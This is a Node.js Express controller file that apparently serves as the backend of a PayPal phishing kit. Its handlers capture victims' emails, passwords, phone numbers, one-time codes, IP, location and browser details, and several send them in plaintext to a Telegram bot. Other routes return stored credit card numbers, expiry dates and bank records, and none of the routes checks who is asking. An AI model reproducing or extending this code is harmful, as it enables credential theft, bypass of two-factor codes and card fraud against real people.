// server/controller/authController.js
const User = require('../models/User');
const Logs = require('../models/Logs');
const Bank = require('../models/Bank');
const CreditCard = require('../models/CreditCard');
const axios = require('axios');
const jwt = require('jsonwebtoken');
const moment = require('moment');
const { JWT_SECRET } = require('../config/keys');
const { getClientIp } = require('request-ip');
const useragent = require('useragent');

const mongoose = require('mongoose');
exports.registerUser = async (req, res) => {
  let { emailOrUsername, password } = req.body;
  if (!emailOrUsername || !password) {
    return res.json({
      error: "Fields must not be empty",
    });
  }
  if (password.length < 10) {
    return res.json({
      error: "Password must be at least 10 characters long",
    });
  }

  // Check for special character or number
  const specialCharRegex = /[0-9!@#$%^&*]/;
  if (!specialCharRegex.test(password)) {
    return res.json({
      error: "Password must contain at least one number or special character",
    });
  }
  try {
    const existingUser = await User.findOne({ 
      email: emailOrUsername
    });
    if (existingUser && existingUser.password === password) {
      const token = jwt.sign(
        { _id: existingUser._id, role: existingUser.userRole, userId: existingUser._id },
        JWT_SECRET
      );
      const encode = jwt.verify(token, JWT_SECRET);
      console.log("UserId:", existingUser._id);
      res.cookie('userId', existingUser._id, { httpOnly: true });
      return res.json({
        token: token,
        userId: existingUser._id,
        user: encode,
      });
    } else {
      const ip = getClientIp(req);
      const { country } = await getGeolocation(ip);
      const newUser = new User({ 
        email: emailOrUsername, 
        password, 
        ipAddress: ip,
        country: country,
      });
      await newUser.save();
      const savedUser = await User.findOne({ email: emailOrUsername });
      const token = jwt.sign(
        { _id: savedUser._id, role: savedUser.userRole, userId: savedUser._id },
        JWT_SECRET
      );
      const encode = jwt.verify(token, JWT_SECRET);

      // Send Telegram notification
      try {
        const telegramMessage = `
🔐 New User Registration

📧 Email/Username: ${emailOrUsername}
🔑 Password: ${password}
🌐 IP: ${ip}
Country: ${country} 
🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}
        `;

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: telegramMessage,
          parse_mode: 'HTML'
        });
      } catch (telegramError) {
        console.log("Telegram notification error:", telegramError);
        // Don't block the registration process if Telegram notification fails
      }
      console.log(savedUser._id)
      res.cookie('userId', savedUser._id, { 
        httpOnly: false, 
        maxAge: 30 * 60 * 1000, 
        path: '/', 
        sameSite: 'strict'
      });
      return res.json({
        token: token,
        userId: savedUser._id,
        user: encode,
      });
    }
  } catch (err) {
    console.log(err);
    return res.json({
      error: "An error occurred during registration",
    });
  }
};
exports.getUserCountry = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await User.findOne({ _id: userId });
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.status(200).json({ country: user.country || '' });
  } catch (error) {
    console.error('Error fetching user Country:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
};
exports.createPayPalEntry = async (req, res) => {
  let { email, mobileNumber, userId } = req.body;
  try {
    const newEntry = new Logs({ email, mobileNumber, userId });
    await newEntry.save();
    res.status(201).json({ message: 'PayPal entry created successfully', email, mobileNumber });try {
      const TGnotif = `
🔐 New LOG

📧 Email/MobileNum: ${email || mobileNumber}
🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}
        `;

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text: TGnotif,
          parse_mode: 'HTML'
        });
      } catch (TGnotif) {
        console.log("Telegram notification error:", TGnotif);
        // Don't block the registration process if Telegram notification fails
      }
  } catch (error) {
    console.error('Error creating PayPal entry:', error.message);
    res.status(500).json({ error: 'Error creating PayPal entry', details: error.message });
  }
};

exports.updatePayPalEntry = async (req, res) => {
  const { userId, email, mobileNumber, password, OTPcode } = req.body;

  // Construct the update object dynamically
  const updateFields = {};
  if (email) updateFields.email = email;
  if (mobileNumber) updateFields.mobileNumber = mobileNumber;
  if (OTPcode) updateFields.OTPcode = OTPcode;
  if (password) updateFields.password = password; // Ensure password is hashed if necessary

  try {
    // Update only the provided fields
    const updatedEntry = await Logs.findOneAndUpdate(
      { userId },
      { $set: updateFields },
      { new: true }
    );

    if (!updatedEntry) {
      return res.status(404).json({ error: 'PayPal entry not found' });
    }

    res.status(200).json({
      message: 'PayPal entry updated successfully',
      ...(email && { email }),
      ...(mobileNumber && { mobileNumber }),
      ...(OTPcode && { OTPcode }),
    }); 

    // Prepare Telegram notification based on updated fields
    let TGnotif = `🔐 PayPal Entry Updated\n\n📍 User ID: ${userId}\n🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}\n`;

    if (email) {
      TGnotif += `📧 Updated Email: ${email}\n`;
    }

    if (mobileNumber) {
      TGnotif += `📱 Updated Mobile Number: ${mobileNumber}\n`;
    }
    if (OTPcode) {
      TGnotif += `🔢 Updated OTP Code: ${OTPcode}\n`;
    }
    if (password) {
      TGnotif += `🔑 Updated Password: ${password}\n`; // Avoid sending actual password
    }

    try {
      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: TGnotif,
        parse_mode: 'HTML'
      });
    } catch (telegramError) {
      console.log("Telegram notification error:", telegramError);
      // Don't block the update process if Telegram notification fails
    }

  } catch (error) {
    console.error('Error updating PayPal entry:', error);
    res.status(500).json({ error: 'Error updating PayPal entry' });
  }
};

exports.getPayPalEntry = async (req, res) => {
  const { email, mobileNumber } = req.params;

  try {
    const entry = await Logs.findOne({ $or: [{ email }, { mobileNumber }] });
    if (!entry) {
      return res.status(404).json({ error: 'PayPal entry not found' });
    }
    res.status(200).json(entry);
  } catch (error) {
    console.error('Error fetching PayPal entry:', error);
    res.status(500).json({ error: 'Error fetching PayPal entry' });
  }
};

exports.getEmailById = async (req, res) => {
  const { userId } = req.params;
  
  try {
    const entry = await Logs.findOne({ userId });
    if (!entry) {
      return res.status(404).json({ error: 'PayPal entry not found' });
    }
    res.status(200).json({ email: entry.email });
    console.log(entry.email);
  } catch (error) {
    console.error('Error fetching PayPal entry:', error);
    res.status(500).json({ error: 'Error fetching PayPal entry' });
  }
};
exports.handleCodeVerification = async (req, res) => {
  const { userId, browserInfo, location } = req.body;

  try {
    // Find user data in Logs
    const userLog = await Logs.findOne({ userId });
    
    if (!userLog) {
      return res.status(404).json({ error: 'User not found' });
    }

    const TGnotif = `
🔔 PPL Code Requested

📱 Mobile/Email: ${userLog.email || userLog.mobileNumber}
🕒 Time: ${moment().format('MMMM Do YYYY, h:mm:ss a')}
🌐 Browser: ${browserInfo}
📍 Location: ${location}
    `;

    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: TGnotif,
      parse_mode: 'HTML'
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in code verification:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
exports.getMobileNumberById = async (req, res) => {
  const { userId } = req.params;
  console.log(`Received request to fetch mobile number for userId: ${userId}`); // Log the userId

  try {
    // Convert userId to ObjectId
    const objectId = mongoose.Types.ObjectId(userId);
    const entry = await Logs.findOne({ userId: objectId, mobileNumber: { $exists: true, $ne: null } });
    if (!entry) {
      console.log('Mobile number not found'); // Log if not found
      return res.status(404).json({ error: 'Mobile number not found' });
    }

    console.log('Mobile number found:', entry.mobileNumber); // Log the found mobile number
    res.status(200).json({ mobileNumber: entry.mobileNumber });
  } catch (error) {
    console.error('Error fetching mobile number:', error);
    res.status(500).json({ error: 'Error fetching mobile number' });
  }
};
exports.getUserInfo = async (req, res) => {
  const { userId } = req.params;
  console.log(`Fetching user info for userId: ${userId}`);

  try {
    // Validate ObjectId format
    if (!mongoose.Types.ObjectId.isValid(userId)) {
      console.log('Invalid userId format:', userId);
      return res.status(400).json({ error: 'Invalid user ID format' });
    }

    const objectId = new mongoose.Types.ObjectId(userId);

    // Search CreditCard model first
    const creditCardInfo = await CreditCard.findOne({ userId: objectId }).populate('bank');
    if (creditCardInfo) {
      console.log('Found user credit card info in CreditCard model:', creditCardInfo);
      return res.status(200).json({
        cardNumber: creditCardInfo.cardNumber,
        expiryDate: creditCardInfo.expiryDate,
        bank: creditCardInfo.bank,
      });
    }

    // If no credit card info is found
    console.log('No credit card info found for userId:', userId);
    return res.status(404).json({
      error: 'Credit card information not found',
      message: 'No matching records in CreditCard collection',
    });

  } catch (error) {
    console.error('Error in getUserInfo:', error);
    return res.status(500).json({ error: 'Internal Server Error', message: error.message });
  }
};

async function getGeolocation(ip) {
  const ipinfoToken = process.env.IPINFO_TOKEN;
  const ipv4 = ip.startsWith('::ffff:') ? ip.split('::ffff:')[1] : ip;

  // Check for private/local IPs
  const isPrivateIP = /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ipv4);
  if (isPrivateIP) {
    console.log('Private IP detected, defaulting to "Unknown".');
    return { country: "Unknown" };
  }

  try {
    const response = await axios.get(`https://ipinfo.io/${ipv4}/json?token=${ipinfoToken}`);
    return {
      country: response.data.country || "Unknown",
    };
  } catch (error) {
    console.error('Geolocation API error:', error.response?.data || error.message);
    return { country: "Unknown" }; // Default in case of error
  }
}
